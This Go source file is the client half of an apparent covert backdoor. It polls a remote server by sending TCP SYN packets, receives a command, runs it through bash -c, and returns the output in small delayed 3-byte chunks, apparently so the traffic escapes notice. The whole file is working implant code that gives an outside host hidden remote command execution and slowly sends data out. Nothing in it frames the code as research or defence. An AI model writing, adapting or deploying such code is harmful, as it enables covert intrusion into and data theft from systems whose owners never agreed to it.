package main

import (
	"encoding/binary"
	"net"
	"os/exec"
	"time"

	"github.com/sirupsen/logrus"
)

const (
	cmdClientPoll   = 1
	cmdClientLen    = 2
	cmdClientStream = 3
)

func clientGetCommand(conn *Connection) []byte {
	conn.SendSYN(cmdClientPoll, []byte{})
	_, data, _, _ := conn.Read()
	cmdlen := binary.LittleEndian.Uint16(data)
	cmd := make([]byte, 0)
	for len(cmd) < int(cmdlen) {
		conn.SendSYN(cmdClientPoll, []byte{})
		_, data, _, _ = conn.Read()
		cmd = append(cmd, data...)
	}
	return cmd
}

func clientSendOutput(conn *Connection, output []byte) {
	lenb := make([]byte, 2)
	binary.LittleEndian.PutUint16(lenb, uint16(len(output)))

	conn.SendSYN(cmdClientLen, lenb)

	for len(output) > 0 {
		n := 3
		if n > len(output) {
			n = len(output)
		}
		time.Sleep(sendDelay)
		conn.SendSYN(cmdClientStream, output[:n])
		output = output[n:]
	}
}

func clientMain(localIP string, localPort int, serverIP string, serverPort int, key []byte) {
	c := NewClientConnection(&net.TCPAddr{IP: ParseIP(serverIP), Port: serverPort}, &net.TCPAddr{IP: ParseIP(localIP), Port: localPort}, key)
	defer c.Close()

	cmd := clientGetCommand(c)
	logrus.Debugf("got command: [%s]", cmd)

	xec := exec.Command("bash", "-c", string(cmd))
	output, err := xec.CombinedOutput()
	if err != nil {
		panic(err)
	}
	clientSendOutput(c, output)
}
